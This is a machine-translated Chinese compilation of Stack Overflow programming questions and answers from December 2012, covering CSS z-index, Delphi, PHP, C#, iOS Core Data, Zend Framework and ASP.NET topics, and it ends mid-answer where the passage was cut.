# html - CSS z-index 没有正确响应 - 隐藏在内容下方的子菜单

> ID：14097240
> 
> 赞同：2
> 
> 时间：2012-12-31T03:54:09.700
> 
> 标签：html, css, z-index

我创建了一个标题功能区菜单（页面顶部的水平菜单），当悬停在其链接上时，会为每个链接打开一个子菜单，该菜单应显示在主要内容的顶部。

问题是子菜单在主内容下方呈现。

我尝试为 sub-menu 设置更高的值`z-index`，但这没有帮助。

当我将主要内容设置`z-index`为`-1`（`0`也不起作用）时，会显示子菜单，但是内容中的所有按钮都不起作用。

我搜索了我的整个 CSS，甚至没有一个`z-index`作业。

**更新**

内容 div 的样式为：

```
#content {
  background: #fff;
  position: absolute;
  top: 176px;
  bottom: 25px;
  padding: 20px 0px 63px;
  overflow: hidden;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:34:23.673

如果你的 menu 和 #content 块都是绝对定位的，你需要在它们上设置一个正的 z-index 值以允许重叠（你的菜单的 z-index 比你的内容高）。

**CSS：**

```
#content {
  background: #fff;
  position: absolute;
  z-index: 1;
  top: 176px;
  bottom: 25px;
  padding: 20px 0px 63px;
  overflow: hidden;
}

#menu {
  z-index:10;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:27:50.973

您将悬停元素设置为什么位置？z-index 仅适用于定位元素（位置：绝对、位置：相对或位置：固定）。

问题可能出在您的 HTML 而不是您的 css 中，例如，如果您忘记关闭某个元素，它可能会与其他元素重叠。

无论哪种方式，如果您在问题中添加了一些代码，都会有很大帮助。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-31T04:22:51.900

可能的错误：

1.  您的 Menu Container Div 可能有负 z-index。

2.  您的 Body 或 Wrapper 可能具有非常大的 z-index 值。

解决方案：

1.  删除所有z-index，只需复制菜单代码并粘贴到body标签或包装器div标签的末尾。您还可以添加 z-index:99; 到子菜单。

2.  从 Body 或 Wrapper 中删除 z-index 并将 z-index 添加到菜单。

# delphi - Delphi XE2 数据模块只需要数据库组件？

> ID：14097246
> 
> 赞同：18
> 
> 时间：2012-12-31T03:55:28.763
> 
> 标签：delphi, delphi-xe2, datamodule

在以前的 Delphi 版本中，我使用数据模块 ( `TDataModule`) 作为保存非可视组件的地方，以避免使主窗体混乱。在 Delphi XE2 中，当我创建一个新的数据模块时，它只允许我在其中放置与数据库相关的组件（例如`TADOConnection`和`TDataSource`）。为什么会这样，我怎样才能将其他组件放入其中？有替代方案吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-31T10:16:18.097

XE2 版本更改了数据模块。请记住，除了长期存在的 VCL 之外，XE2 还引入了一个新的组件框架 FireMonkey。一个名为的新伪属性[`ClassGroup`](http://docwiki.embarcadero.com/RADStudio/XE2/en/ClassGroup_pseudo-property_of_TDataModule)已添加到数据模块中。这控制了可以将哪些组件添加到 IDE 设计器中的数据模块。

数据模块的默认[`ClassGroup`](http://docwiki.embarcadero.com/RADStudio/XE2/en/ClassGroup_pseudo-property_of_TDataModule)值为`System.Classes.TPersistent`. 这指定数据模块是框架中立的，因此既不接受 VCL 组件也不接受 FMX 组件。

在您的情况下，您可能希望接受 VCL 组件，因此您需要指定一个`ClassGroup`.`Vcl.Controls.TControl`

阅读[文档](http://docwiki.embarcadero.com/RADStudio/XE2/en/ClassGroup_pseudo-property_of_TDataModule)`ClassGroup`中的所有内容。

> System.Classes.TDataModule 及其后代类，例如 Web.HTTPApp.TWebModule，有一个名为 ClassGroup 的伪属性，它执行以下操作：
> 
> *   确定数据模块的框架亲和性。也就是说，ClassGroup 指定数据模块要么是框架中立的，要么与特定框架（即 VCL 或 FMX）一起工作。
> *   在工具面板中启用特定于框架的非可视组件。您需要在 Object Inspector 中为 ClassGroup 设置特定于框架的值，以启用特定于框架的非可视组件，例如：
>     *   TActionList 仅适用于 VCL，因此要在 Tool Palette 中启用 TActionList，您必须将 ClassGroup 设置为 VCL 设置。
>     *   TTimer 存在于 FMX 和 VCL 中。要为正确的框架启用 TTimer，您必须将 ClassGroup 设置为 FMX 或 VCL，以匹配父应用程序的框架。（本主题后面将进一步讨论 TTimer 和 TActionList。）

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-12-31T07:52:48.420

这种（越野车）行为

```
unit Unit2;

interface

uses
  System.SysUtils, System.Classes;

type
  TDataModule2 = class(TDataModule)
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
  end;

var
  DataModule2: TDataModule2;

implementation

{%CLASSGROUP 'System.Classes.TPersistent'}

{$R *.dfm}

end. 
```

是线路造成的

```
{%CLASSGROUP 'System.Classes.TPersistent'} 
```

要摆脱只是删除或修改该行

```
{.%CLASSGROUP 'System.Classes.TPersistent'} 
```

切换到`Design`View 后，您将看到所有组件，如您所愿。

（德尔福 XE2 16.0.4504.48759）

# php - 在数组结束之前做一些事情

> ID：14097248
> 
> 赞同：1
> 
> 时间：2012-12-31T03:55:43.913
> 
> 标签：php, arrays

我有一个看起来像这样的数组：

```
$array = array('element1', 'element2', 'element3');

foreach($array as $a){
    echo $a;
} 
```

我需要做的是在数组的最后一个元素之前做一些事情，这样我的回声看起来像这样：

element1，element2，看马！我做了点什么！，element3。

我想要的是当且仅当我们在数组中的最后一个元素之前运行一个函数，而不管大小。

我曾想过使用 end($array); 但如果是这样，我会这样做吗？

```
foreach($array as $a){
    if(!end($array)){
        call_func(); // this seems wrong.
    }

    echo $a;
} 
```

想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T03:58:48.857

尝试：

```
$last_key = end(array_keys($array));
foreach($array as $key => $a){
    if ($key == $last_key) {
        call_func(); 
    }

    echo $a;
} 
```

或者你也可以这样做，

```
$array = array('element1', 'element2', 'element3');
end($array);
$last_key = key($array);
foreach($array as $key => $a){
    if ($key == $last_key) {
        call_func(); 
    }

    echo $a;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:58:31.113

您可以检查`end()`您的阵列。

```
$lastElement = $currentElement === end($array) 
```

在你的例子中，那将是......

```
foreach($array as $a){
    if($a === end($array)){
        // Last iteration.
    }

    echo $a;
} 
```

这当然依赖于元素的独特性。否则，您可以使用计数器，或使用密钥并将其与最后一个密钥 ( `end(array_keys($array))`) 进行比较。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T03:58:45.730

你可以这样做-

```
$array = array('element1', 'element2', 'element3');
$count = count($array)-1;
$loop = 1;
foreach($array as $a){
    echo $a;
    $loop++;
    if($count == $loop)
      echo "You text to be print";
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T03:59:15.293

通常我会做类似的事情：

```
$arrlen = count($array);
foreach($array as $i => $a) {
  if ($arrlen == $i + 1) {
    call_func();
  }
  echo $a;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-31T03:59:19.630

您的 if 语句应该是`if($a == end($array))`，但即使这样也不一定意味着它是数组的最后一个值（可能有重复）。

# c - 将数据从 C 程序发送到命令行密码提示

> ID：14097249
> 
> 赞同：3
> 
> 时间：2012-12-31T03:56:00.383
> 
> 标签：c, command-line, ssh

ssh 命令行命令提示用户输入密码，如下所示：

密码：

在 C 中，当我这样做时：

```
system("ssh name@host");
system("password"); 
```

命令行将提示用户并忽略来自我的程序的任何输入。它似乎总是接受用户输入的输入。有没有办法将我放入标准输出的输出重定向并将其通过管道传输到 ssh 的密码提示中？

我尝试了很多方法，从上面到将 ssh 视为文件指针，如下所示：

```
FILE *ssh = popen("ssh -t -t -S -o StrictHostKeyChecking=no name@host", "w"); 
```

然后写入该文件指针，但似乎没有任何工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:05:19.523

的确。SSH 将`/dev/tty`直接打开并从中读取密码，因此您无法以这种方式传递任何输入。`libssh2`正如shiplu所说，除了使用之外，我不知道没有办法覆盖这种行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T04:04:10.423

当您正在编码时，请`C` **考虑使用[libssh2](http://www.libssh2.org/)**。请参阅[此示例](http://www.libssh2.org/examples/ssh2_exec.html)。

[这里](http://www.libssh2.org/examples/)有更多的例子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T04:12:46.053

有另一种方法可以解决您的问题 -`ssh-keygen`和`ssh-copy-id`.

本质上，您将公钥复制到主机一次；在此之后的任何连接上，`ssh`将自动使用其私钥登录。

跑

```
ssh-keygen 
```

点击进入 3 次。跑：

```
ssh-copy-id user@host 
```

并输入您的密码。

而已。

# ios - gcd/dispatch_async 和 CoreData 冻结应用程序

> ID：14097254
> 
> 赞同：3
> 
> 时间：2012-12-31T03:56:56.387
> 
> 标签：ios, core-data, grand-central-dispatch, freeze, dispatch-async

出于某种原因，同时使用 dispatch_async 和 Core Data 会导致我的应用程序完全冻结，但没有崩溃。

## 症状

用户界面没有响应。该应用程序不会崩溃。

该应用程序用于`[[UIAccelermeter sharedAccelerometer] setDelegate: self]`连续获取加速度计值。" `accelerometer:didAccelerate:`" 回调在主线程上运行。发生此问题时，回调不再执行。

因此主线程似乎被“冻结”了。

## 语境

我`NSURLConnection`在我的应用程序中使用将 HTTP 请求发送到我的服务器。在处理响应数据的 connectionDidFinishLoading 中，执行大约需要 2 秒，并且在这 2 秒内用户界面将无响应，因为它在主线程中运行。

经过一番研究，在这种情况下执行数据处理似乎`gcd/dispatch_async`是最好的解决方案。因此，在 中`connectionDidFinishLoading`，我添加了以下 gcd 调用：

```
dispatch_queue_t queue;
queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
dispatch_async(queue, ^{
    [self handleTheData: connection];
}); 
```

这有时可以正常工作，但它会导致应用程序随机冻结 - 即使使用相同的代码，在 Core Data 存储中使用相同的数据，重复测试表明可以在 X% 的时间内观察到症状。发生问题的可能性受几个因素的影响，下文将进一步解释。

## handleTheData() 有什么作用？

它检查来自 的响应数据`NSURLConnection`，这是 JSON 格式的字符串。该字符串是 3 个实体列表，每个实体是一个数字数组的数组。因此有代码可以将 JSON 格式的字符串转换为 3 个自定义对象的 NSMutableArray，其中每个对象都是一个子类 NSManagedObject。

在转换过程中，由于这些对象是“临时的”，它们可能会或可能不会永久存储，因此它们是在“nil”NSManagedObjectContext 中创建的，如下所示：

```
SampleEntity *newEntity= 
(SampleEntity *) [[NSManagedObject alloc] initWithEntity:entity 
                       insertIntoManagedObjectContext:nil
               ]; 
```

这样，它们就不会与主要上下文混合。

然后将这些新对象与数据存储中的现有实体进行比较。因此，需要从数据存储中重复获取一些代码以查看特定的新实体是否已经存在，并且根据新实体的数据，新实体可能会保存到数据存储中，或者可能会更新现有实体。

经常调用 [managedObjectContext save: &error] 以确保永久保存更改。

## 还有什么在后台运行吗？

如症状部分所述，Accelerometer 使用 [[UIAccelermeter sharedAccelerometer] setDelegate: self] 在主线程的后台运行

AudioUnits 也被设置为在后台运行（根据 Apple 文档，在单独的“优先级”线程上）以产生声音。

## 问题原因的调查结果

发现问题发生的几率受以下因素影响：

*   如果某些调试代码被注释掉，例如 NSLog(@"fetchedResult: %@", fetchedResult)，问题发生的机会就会降低（但仍然会发生）。
*   如果不使用加速度计，这个问题几乎不会发生（但不是 100% 肯定，因为我做了有限数量的测试）。
*   如果使用加速度计，问题发生的可能性约为 50/50。
*   如果某些核心数据代码（例如 [sampleEntity setXYZ..]）被注释掉，即使使用了加速度计，该问题也几乎不会发生。

## 第二期

此外，即使主线程没有被冻结，也会发生另一个问题。数据处理代码将在中途结束而不会引发错误。

*   这意味着，数据处理只会部分完成，不会抛出错误，主线程继续正常运行。
*   只要主要问题没有发生，第二个问题就会经常（但并非总是）发生。

有趣的问题不是吗？:)

*编辑*

*   2013 年 3 月 1 日 - 我之前认为问题的原因是 iOS 6。抱歉，这是完全错误的。修改描述以反映新发现。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-13T16:29:25.737

我最终向 Apple 开发支持提出了技术支持事件。我也为他们提供了一个示例项目，它显示了相同的症状。

几天后，我收到了他们的回复，指向我的 CoreData 编程指南，并指出调度队列运行的代码需要有自己的私有 NSManagedObjectContext。

[https://developer.apple.com/documentation/coredata/using_core_data_in_the_background](https://developer.apple.com/documentation/coredata/using_core_data_in_the_background)

一旦我听从了建议，问题似乎就解决了！

# php - 如何正确格式化表单操作的 PHP 输出？

> ID：14097256
> 
> 赞同：0
> 
> 时间：2012-12-31T03:57:07.510
> 
> 标签：php, forms, post, text-files, fwrite

我想将以下表单操作的输出保存在这样的文本文件中：

```
var1
var2
var3 
```

示例表单操作：

```
<form action="myform.php" method="post">

<input type="hidden" name="var1" value="var1">
<input type="hidden" name="var2" value="var2">
<input type="hidden" name="var3" value="var3">

<input type="submit" name="formSubmit" value="Submit">
</form> 
```

示例 myform.php

```
<?php

  $fs = fopen("mydata.txt","w");
  fwrite($fs,$_POST['var1']);
  fwrite($fs, "\n");
  fwrite($fs,$_POST['var2']);
  fwrite($fs, "\n");
  fwrite($fs,$_POST['var3']);
  fwrite($fs, "\n");
  fclose($fs);

?> 
```

但是，输出是：

```
var1var2var3 
```

我能做些什么来解决它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:22:17.333

如果您使用的是 windows，您将不会在新行中看到这些变量。这是因为 Windows`\r\n`用作行终止符。

`var1\nvar2\nvar3\n`在 Windows 中将呈现为

```
var1var2var3 
```

但在 Linux 或 Unix（`\n`行终止）中，它将呈现为

```
var1
var2
var3 
```

所以你必须使用`\r\n`而不是`\n`像这样

```
fwrite($fs, "\r\n"); 
```

这将在任何操作系统上呈现新行中的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:02:23.800

您是为了调试目的还是为了在应用程序中实际存储而这样做？无论哪种方式，如果用户不应该直接将其作为文本文件读取，则可以使用 var_export 函数保存 POST 数组。

```
<?php
file_put_contents("C:/debug.txt", var_export($_POST, true));
?> 
```

当你使用 var_export 时，你在文件中得到的是一个有效的 PHP 代码，所以如果你以后想要，你可以将它用作一个数组并将你的数据返回到应用程序中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:31:56.383

`PHP_EOL`自 PHP 4.3.10 和 PHP5 自 PHP 5.0.2 起，预定义常量在 PHP4 中可用。

它将为任何操作系统添加正确的行尾。

```
fwrite($fs, PHP_EOL); 
```

如果您在一个操作系统中开发项目并将其部署在运行不同操作系统的服务器中，请使用此选项。

# windows - Windows 下 Puppet/Vagrant 中的颜色编码？

> ID：14097257
> 
> 赞同：2
> 
> 时间：2012-12-31T03:57:10.407
> 
> 标签：windows, cmd, puppet, vagrant

当运行 Puppet/Vagrant 并应用清单时，输出是彩色编码的，除了洋红色的错误之外，一切都是青色的。

```
vagrant up 
```

**问题：**但是在 Windows 上，没有颜色编码，一切都是黑色背景上的白色字体。有没有办法打开颜色编码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-01T13:20:39.940

检查您的 TERM 变量：“echo $TERM”。

如果您在 Windows 中使用 putty，请“导出 TERM=putty”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-17T04:27:33.320

在我的情况下，将 env var ANSICON 设置为任何值都有帮助： `set ANSICON=blabla`

# php - 属性默认值为 null 是否与无默认值相同？

> ID：14097258
> 
> 赞同：25
> 
> 时间：2012-12-31T03:57:16.087
> 
> 标签：php, properties, null, default-value

因此我可以安全地重构所有实例吗

```
class Blah
{
    // ...
    private $foo = null;
    // ...
} 
```

到

```
class Blah
{
    // ...
    private $foo;
    // ...
} 
```

?

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-12-31T04:16:29.790

### 无类型属性

简单的回答，是的。见[http://php.net/manual/en/language.types.null.php](http://php.net/manual/en/language.types.null.php)

> 特殊的 NULL 值表示没有值的变量。NULL 是 null 类型的唯一可能值。

您可以通过对属性执行 a 轻松测试`var_dump()`，您将看到两个实例`NULL`

```
class Blah1
{
    private $foo;

    function test()
    {
        var_dump($this->foo);
    }
}

$test1 = new Blah1();
$test1->test(); // Outputs NULL

class Blah2
{
    private $foo = NULL;

    function test()
    {
        var_dump($this->foo);
    }
}

$test2 = new Blah2();
$test2->test(); // Outputs NULL 
```

### 类型化的属性

PHP 7.4 添加了类型化属性，默认情况下它不像非类型化属性那样默认为`null`默认状态，而是默认为特殊的“未初始化”状态，如果在写入之前读取该属性将导致错误。请参阅[PHP 文档中的“类型声明”部分了解 properties](https://www.php.net/manual/en/language.oop5.properties.php)。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-01-02T03:30:49.033

> 属性默认值为 null 是否与无默认值相同？

# 是的

[[根据文档：](http://php.net/manual/en/language.types.null.php)]

> 特殊`NULL`值表示没有值的变量。

`null`是尚未设置为任何特定值的变量的概念。区分`null`和空¹值时相对容易出错。

`private $foo = null;`完全等价于`private $foo;`。在这两种情况下，类属性的值都定义为`null`。

`isset`将正确返回;`false`的两个声明 是 的相反布尔值，并且这些值是，如上所述，。`$foo``isset``is_null``null`

作为参考，我建议查看[PHP 类型比较表](http://php.net/manual/en/types.comparisons.php)。

[1：在这种情况下，我指的是为[`empty`](http://php.net/manual/en/function.empty.php)函数返回 true 的类型值，或者被认为是“falsey”的类型值。IE `null`, `0`, `false`, 空数组 ( `array()`) 和空字符串 ( `''`)。`'0'`在技​​术上也是空的，尽管我觉得 PHP 作为一种语言很奇怪。]

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-07-30T09:06:49.507

除了公认的答案仍然正确之外，随着 PHP 7.4 中类型属性的添加，还有一些新的事情需要考虑。

给定以下代码

```
class A {
    public ?DateTime $date;
}

$a = new A();
$a->date; 
```

你会得到错误

```
PHP Fatal error:  Uncaught Error: Typed property A::$date must not be accessed before initialization 
```

这意味着即使这是一个有效值，该属性`$date`也不会自动初始化。`null`您必须像初始化它一样直接初始化它`public ?DateTime $date = null;`或使用构造函数来这样做。

# c# - Directory.EnumerateFiles 读取顺序

> ID：14097264
> 
> 赞同：11
> 
> 时间：2012-12-31T03:58:12.533
> 
> 标签：c#, arrays, file, indexing, ienumerable

该方法的默认读取顺序是`Directory.EnumerateFiles`什么？是否一致？

到目前为止，根据我的经验，它似乎是在创建文件的日期之前，但我无法找到对此的确认。

我问的原因是因为我正在处理的程序的一部分将二进制文件从目录加载到对象中，然后再加载到数组中。这些对象通过索引数组相互引用，这意味着它们加载到数组中的顺序需要保持一致（以避免移动索引）。

当我在这里时，我还有一个小问题。当文件被删除时，无论我做什么，它显然都会改变加载到数组中的文件的索引。有什么建议可以避免这个问题吗？到目前为止，由于担心存储问题，我一直避免使用字典（如果可以避免的话，我宁愿不存储文本键数组），但如果这是唯一可行的方法，我可能无论如何都必须实现它。

* * *

**编辑：**从您的答案中获得出色提示后，我使用文件名重构为字典方法。性能影响几乎可以忽略不计，可读性和可维护性都得到了极大的改善，因此效果很好。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-12-31T04:11:07.560

.NET 使用的底层 Win32 API 是`FindFirstFile`和`FindNextFile`. 该[文档特别指出](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364428(v=vs.85).aspx)：

> 此函数返回文件名的顺序取决于文件系统类型。对于 NTFS 文件系统和 CDFS 文件系统，名称通常按字母顺序返回。对于 FAT 文件系统，名称通常按照文件写入磁盘的顺序返回，可能是也可能不是字母顺序。但是，如前所述，不能保证这些行为。

所以不，您不能保证返回文件的顺序。其他答案提供了足够的方法来解决此问题。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-12-31T04:02:39.220

据我所知，它没有记录在案 - 因此即使你*能*发现一种模式，你也不应该依赖它。它可能取决于 .NET 的版本或操作系统的版本，或者只是在服务包之间更改。相反，如果你需要一些特定的顺序，你应该自己排序。当然，不幸的是，这需要在处理之前找到所有文件名，但这会给你带来一致性。

不过老实说，听起来您的数据模型非常脆弱。你还没有真正告诉我们你正在做什么来修复它，但是在结果中使用文件的整数索引`Directory.EnumerateFiles`肯定*不是*最好的方法。

如果您使用文件*名*而不是索引，则可能允许您在阅读文件时处理文件 - 但可能会有更好的方法，具体取决于您要执行的操作。使用名称应该仍然相当便宜 - 它只是一个字符串引用而不是整数，即使它在多个地方使用，它也会是对同一个字符串对象的多个引用。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-31T04:06:42.710

文档没有指定顺序，但您始终可以通过使用 LINQ 的`OrderBy`功能来强制执行您想要的顺序。

您可以通过清除对 的引用来跳过索引更改`null`，而不是实际从数组中删除项目。这里的权衡是您现在必须检查给定索引处的项目是否为`null`.

如果您有一个基于 a 的更具可读性的数据结构`Dictionary`，请考虑切换到它，并忽略效率问题，直到您的分析器告诉您必须优化代码的这个特定部分。

# javascript - 使用 Javascript 或 JQuery 更改 JSON 值

> ID：14097271
> 
> 赞同：0
> 
> 时间：2012-12-31T03:59:09.227
> 
> 标签：javascript, jquery, json

我有以下代码。但是，它的问题在于它不会更改`nameElem.data('index')`，因此每当代码运行时，它只会显示列表中的元素 1。如何更改`nameElem.data('index')`json 值？我试过`cardInfo[i].data.index = index;`了，但没有奏效。

```
$('#next').on('click', function(e) {
    e.preventDefault();
    var nameElem = $('#team-name');
    var entries = nameElem.data('entries');
    var index = (nameElem.data('index') + 1) % entries.length;
    nameElem.text(entries[index]);
}) 
```

保持简单：**如何将 json 值 - nameElem.data('index') 设置为 var index？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:02:19.940

这不是 JSON 值，我不知道您为什么要谈论 JSON 值……但无论如何：

```
nameElem.data("index",index); 
```

那应该这样做。

# c# - 在 C# 中设置 ICollection 属性的值

> ID：14097274
> 
> 赞同：4
> 
> 时间：2012-12-31T03:59:20.583
> 
> 标签：c#, properties, icollection

我的类继承了一个接口，所以我需要在 Person 类中有 emailaddress 属性。

我的问题是获取属性和设置属性的最佳方法是什么

```
public class Contact : IPerson, ILocation
{
  ...
  [MaxLength(256)]
  public string EmailAddress { 
  get{
    return this.Emails.First().ToString();
  } 
  set{ ????  }
  }
  ....

  public virtual ICollection<Emails> Emails { get; set; }
} 
```

本质上，我试图让班级允许不止一封电子邮件。

为了充分披露，我对此很陌生，我可能没有问正确的问题，但我已经搜索了一天半并且没有看到这样的东西（不是我认为它不寻常）并且可以使用洞察力。

电子邮件类属性：

```
[Key]
public int Id { get; set; }

[MaxLength(256)]
    public string EmailAddress { get; set; } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:22:06.437

您是否可以控制`IPerson`迫使您实施的界面设计`EmailAddress`？如果是这样，我建议重新考虑设计以避免在同一对象上同时需要单个属性和电子邮件地址列表。

您可能还需要考虑制作`Emails`属性 setter `protected`，以防止外部代码更改对象的数据。

如果您必须实现此接口，并且希望该`EmailAddress`属性始终引用集合中的第一封电子邮件，您可以尝试此代码。

```
public class Contact : IPerson, ILocation
{
  public Contact()
  {
    // Initialize the emails list
    this.Emails = new List<Emails>();
  }

  [MaxLength(256)]
  public string EmailAddress
  { 
    get
    {
      // You'll need to decide what to return if the first email has not been set.
      // Replace string.Empty with the appropriate value.
      return this.Emails.Count == 0 ? string.Empty : this.Emails[0].ToString();
    } 
    set
    {
      if (this.Emails.Count == 0)
      {
        this.Emails.Add(new Emails());
      }
      this.Emails[0].EmailAddress = value;
    }
  }

  public virtual IList<Emails> Emails { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:09:08.210

编辑：起初我不明白这个问题。

在这种情况下，我不确定您尝试做的事情是否有意义。您正在从 getter 上的电子邮件集合中取出第一封电子邮件；那么你想要二传手的行为是什么？它可以 (a) 将设置值更新或插入到集合中的第一个位置，或者 (b) 只需在设置时将电子邮件添加到集合中。我不确定我是否会允许设置它，只需获取并保留它。

我还将重命名属性 FirstEmail 或其他名称，因此很明显它来自可能的电子邮件集合。

```
 public string FirstEmailAddress { 
      get{
         return this.Emails.Count > 0 ? this.Emails.First().ToString() : string.Empty;
      } 
  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T04:17:05.727

通常，当您想向世界“展示”一个内部集合时，您所做的就是将其设为属性并仅创建一个 getter。这样您就不能将整个集合设置为`Contact.Emails = new ICollection<Email>()`，这是一种不好的做法。但是您可以通过它访问集合`Contacts.Emails`并对其进行迭代或添加项目等。

如果您愿意，还可以向此属性添加索引器：http: [//msdn.microsoft.com/en-us/library/vstudio/6x16t2tx (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/vstudio/6x16t2tx(v=vs.100).aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T04:32:37.463

从你的评论来看，

> 我在联系人和他们的电子邮件之间有一对多（因此是集合）。因为我继承了一个接口，所以我不能排除 EmailAddress 属性（从接口中）。所以我不知道从哪里拿它。我可以忽略这个集合，只通过关系来做吗？

你不应该允许`public`二传手。让它`protected`像你标记的虚拟一样。

```
public virtual ICollection<Emails> Emails { get; protected set; } 
```

对于您的 EmailAddress 设置器，您可以使用以下

```
[MaxLength(256)]
public string EmailAddress 
{ 
    get
    {
        return this.Emails.DefaultIfEmpty(new EMail()).First().EmailAddress;
    } 
    set
    {
        if (Emails == null)
        {
            Emails = new Collection<Email>(); 
        }
        Emails.Items.Insert(0, new EMail {EmailAddress = value}); 
    }
} 
```

# java - JSoup 检索 URL 不起作用

> ID：14097275
> 
> 赞同：0
> 
> 时间：2012-12-31T03:59:31.143
> 
> 标签：java, jsoup

我有一个[URL](http://www.baidu.com/link?url=7ygPGJqjJ4zBBpC8yDF8xDhhwH3nAI9fF7k3rpEUPN38B5JxSjcxggx52Vzl-7OHM6803JG7iS5jWXVV2MXlPFedN-RZl6Mui_vhsT5c)，我使用 JSoup 来检索此 URL 指示的网页。

```
try{
    doc = Jsoup.connect(url).timeout(5000).get();
}catch(IOException e){
    e.printStackTrace();
} 
```

但我得到以下异常：

```
Exception in thread "main" java.lang.IllegalArgumentException: Must supply a valid URL
    at org.jsoup.helper.Validate.notEmpty(Validate.java:102)
    at org.jsoup.helper.HttpConnection.url(HttpConnection.java:48)
    at org.jsoup.helper.HttpConnection.connect(HttpConnection.java:24)
    at org.jsoup.Jsoup.connect(Jsoup.java:59) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:12:22.540

检查以下内容：

1.  您正在将预期的 URL 传递给`url`变量。
2.  URL 的格式很好，只是为了更加确定。

`notEmpty`Jsoup 的 Validate.java 中的 Method 检查 Url 是否为空。

```
 public static void notEmpty(String string) {
        if (string == null || string.length() == 0)
            throw new IllegalArgumentException("String must not be empty");
    } 
```

# php - 为 Zend Framework 2 控制器设置默认布局的理想位置？

> ID：14097279
> 
> 赞同：1
> 
> 时间：2012-12-31T04:01:36.210
> 
> 标签：php, layout, controller, zend-framework2

我想为新的 Controller 设置不同的布局，请提供您对在控制器上设置它的理想位置的建议？现在我正在使用`$this->layout()`每一个动作。在 ZF1 中曾经有`preDispatch`，不知道它在 ZF2 中是如何实现的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T09:14:44.857

`dispatch`当调用控制器动作时，每个控制器都会触发一个事件。这个事件被封装在一个`EventManager`包含一些标识符的对象中。这使得 a可以使用特定标识符`SharedEventManager`侦听 EventManager 中的特定事件**。**

现在每个控制器（例如`MyModule\Controller\FooController`）都有两个已知的标识符：

1.  班级名称 ( `MyModule\Controller\FooController`)
2.  类的顶级命名空间 ( `MyModule`)

MyModule 的 Module.php 类是放置此逻辑的最佳位置。当应用程序启动时，您为该模块（即 Module.php 类的命名空间！）附加一个侦听器，用于调度事件。这确保在调用控制器的操作时调用该函数，但在调度另一个控制器时不会执行侦听器。

```
namespace MyModule;

use Zend\Mvc\MvcEvent;

class Module
{
    public function onBootstrap($e)
    {
        $app = $e->getApplication();
        $em  = $app->getEventManager(); // Specific event manager from App
        $sem = $em->getSharedManager(); // The shared event manager

        $sem->attach(__NAMESPACE__, MvcEvent::EVENT_DISPATCH, function($e) {
            $controller = $e->getTarget(); // The controller which is dispatched
            $controller->layout('layout/my-module-layout');
        });
    }
} 
```

这种方法（如何在特定模块内使用控制器进行操作）也在[我的博客文章中进行](http://juriansluiman.nl/en/article/119/attach-a-view-strategy-for-specific-modules)了说明。因为模块特定的布局在 Zend Framework 2 中变得相当普遍，Evan Coury 为此制作了一个模块。它被称为[EdpModuleLayout](https://github.com/EvanDotPro/EdpModuleLayouts)，安装模块时它相当容易。

`MyModule`您在配置中提供一个=>数组，`layout/template`其余的由模块处理。

# c# - 'System.Web.UI.WebControls.ListItemCollection' 中不允许使用文字内容 ('')

> ID：14097280
> 
> 赞同：0
> 
> 时间：2012-12-31T04:01:47.130
> 
> 标签：c#, asp.net, ascx

我面临以下错误：

```
Literal content ('</asp:RequiredFieldValidator>') is not allowed within a 'System.Web.UI.WebControls.ListItemCollection' 
```

对于以下代码（在 customer.ascx 中）：

```
<div class="customerTableRow">
    <div class="customerTableLeftCol">
        <asp:Label ID="CustomerCountryLabel" runat="server" Text="Country:"></asp:Label>
    </div>
    <div class="customerTableRightCol">
        <asp:DropDownList ID="CustomerCountryDropDownList" runat="server">
            <asp:RequiredFieldValidator ID="CustomerCountryRequiredFieldValidator" ControlToValidate="CustomerCountryDropDownList" runat="server" ErrorMessage="RequiredFieldValidator">
            </asp:RequiredFieldValidator>
        </asp:DropDownList>
    </div>
</div> 
```

我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:14:22.183

将 RequiredFieldValidator 移出 DropDownList

```
<div class="customerTableRow">
    <div class="customerTableLeftCol">
        <asp:Label ID="CustomerCountryLabel" runat="server" Text="Country:"></asp:Label>
    </div>
    <div class="customerTableRightCol">
